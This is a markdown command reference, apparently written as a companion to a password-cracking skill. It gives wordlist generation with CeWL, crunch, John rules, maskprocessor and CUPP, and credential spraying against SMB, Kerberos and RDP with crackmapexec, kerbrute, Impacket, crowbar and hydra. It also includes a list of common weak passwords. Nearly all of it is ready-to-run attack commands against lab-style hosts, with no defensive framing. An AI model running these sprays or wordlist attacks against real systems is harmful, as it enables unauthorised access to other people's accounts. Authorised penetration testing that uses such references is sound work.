# Wordlist Generation and Credential Spraying Reference

Command reference for building targeted wordlists and executing password
spraying against network services. This is the reference-heavy companion to
the `cracking-passwords` skill; the core cracking methodology (hash
identification, hashcat, and John usage) stays inline in `SKILL.md`.

## Contents

- [Wordlist Generation](#wordlist-generation)
  - [CeWL (Web Scraping)](#cewl-web-scraping)
  - [crunch](#crunch)
  - [John Mutation Rules](#john-mutation-rules)
  - [Maskprocessor](#maskprocessor)
  - [CUPP (User Profile)](#cupp-user-profile)
- [Credential Spraying](#credential-spraying)
  - [Spray Weak Passwords](#spray-weak-passwords)
  - [SMB Password Spray](#smb-password-spray)
  - [Kerberos Password Spray](#kerberos-password-spray)
  - [RDP Password Spray](#rdp-password-spray)

## Wordlist Generation

### CeWL (Web Scraping)
```bash
# Generate wordlist from website
cewl -d 2 -m 5 -w wordlist.txt https://example.com

# Include email addresses
cewl -e -d 2 -m 5 -w wordlist.txt https://example.com
```

### crunch
```bash
# Generate all combinations
crunch 6 8 -t Pass@@@ -o wordlist.txt
# @=lowercase, ,=uppercase, %=numbers, ^=symbols

# Generate passwords between 6-8 chars
crunch 6 8 abcdefg123 -o wordlist.txt

# Pattern-based (e.g., Month+Year)
crunch 10 10 -t @@@@@@@%%% -o wordlist.txt
```

### John Mutation Rules
```bash
# Generate mutations
john --wordlist=base.txt --rules --stdout > mutated.txt

# Custom rule
# In john.conf:
[List.Rules:CustomRule]
l                 # lowercase all
u                 # uppercase all
c                 # capitalize
$[0-9]           # append digit
^[0-9]           # prepend digit
```

### Maskprocessor
```bash
# Generate based on mask
mp64.exe ?u?l?l?l?l?d?d?d
mp64.exe -1 ?l?u -2 ?d?s ?1?1?1?1?2?2
```

### CUPP (User Profile)
```bash
# Interactive wordlist generator based on target info
python3 cupp.py -i
```

## Credential Spraying

### Spray Weak Passwords
```bash
# Common weak passwords
Password123
Welcome123
Company123
Spring2024
Summer2024
```

### SMB Password Spray
```bash
# crackmapexec
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Password123' --continue-on-success

# Single password, multiple users
crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123'
```

### Kerberos Password Spray
```bash
# kerbrute
kerbrute passwordspray -d domain.local users.txt Password123

# Impacket
for user in $(cat users.txt); do
  GetNPUsers.py domain.local/${user}:Password123 -dc-ip 10.10.10.10 -no-pass -request
done
```

### RDP Password Spray
```bash
# crowbar
crowbar -b rdp -s 10.10.10.10/32 -U users.txt -c 'Password123'

# hydra (be careful - noisy!)
hydra -L users.txt -p 'Password123' rdp://10.10.10.10
```
